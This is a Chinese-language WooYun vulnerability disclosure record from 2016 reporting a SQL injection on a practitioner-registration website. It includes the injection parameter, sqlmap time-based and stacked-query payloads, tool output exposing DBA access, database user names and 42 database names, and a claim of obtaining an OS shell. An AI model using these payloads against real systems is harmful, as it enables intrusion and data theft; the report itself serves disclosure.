{"id": 75568, "wybug_id": "wooyun-2016-0167121", "wybug_title": "执业师之家某处存在SQL注入（DBA权限+涉及42个库+可os-shell）", "wybug_corp": "广东省信息安全测评中心", "wybug_author": "路人甲", "wybug_date": "2016-01-05 23:32", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： —— 详细说明：  注入点：\nhttp://**.**.**.**/zys/search/?action=list&bid=0&key=1\nkey存在注入，为时间盲注，比较慢\n[22:29:22] [INFO] resuming back-end DBMS 'microsoft sql server'[22:29:23] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: key    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: action=list&bid=0&key=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: action=list&bid=0&key=1' WAITFOR DELAY '0:0:5'-----[22:29:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[22:29:23] [INFO] fetching current user[22:29:23] [WARNING] multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically[22:29:23] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][22:29:29] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[22:29:40] [INFO] adjusting time delay to 1 second due to good response timess[22:29:47] [ERROR] invalid character detected. retrying..[22:29:47] [WARNING] increasing time delay to 2 secondsacurrent user:    'sa'[22:29:52] [INFO] fetching current database[22:29:52] [INFO] retrieved: Zys2010current database:    'Zys2010'[22:30:49] [INFO] testing if current user is DBAcurrent user is DBA:    Truedatabase management system users [9]:[*] dbtest[*] GDWSBSDT[*] gdzczx[*] gdzczx5026[*] sa[*] smartsoft[*] smartsoft_test[*] vc[*] xzxkavailable databases [42]:[*] [gdzczx5000-2014-1][*] [gdzczx5000-2014][*] [gdzczx5000-2015][*] [gdzczx5000-618][*] [gdzczx5000_2014-1-15][*] [gdzczx5000_2014-2-13][*] [gdzczx5000_2014-2-20][*] [gdzczx9000-copy][*] [RegisterManager_Test][*] [YM_Test][*] gdzczx[*] gdzczx5000[*] gdzczx50009888888888[*] gdzczx50009999999999[*] gdzczx5000_20121008[*] gdzczx5001[*] gdzczx5026[*] gdzczx5027[*] gdzczx5028[*] gdzczx5029[*] gdzczx_web[*] gdzczx_web2013[*] master[*] model[*] msdb[*] QueryWork[*] RegisterManager[*] RegisterManager_CXXT[*] ReportServer[*] ReportServerTempDB[*] Spider[*] tempdb[*] test[*] TestRM[*] XZXK[*] XZXK5026[*] XZXK5099[*] Zys2010[*] Zys2010_Test[*] Zys2010_Test20121113[*] 二级建造师_北京[*] 延续注册名单\n42个数据库，又跟广东省建设执业资格注册中心挂在一起，数据量很大，因为是时间盲注，就不继续了！~~~\n\n\n\n上面测试是DBA权限，试试os-shell，发现可以控制！~~~而且权限很大！~~~测试几个命令看看！~~~\n\n\n\n   漏洞证明：  如上   修复方案：  你们懂！~~~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-08 11:08 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}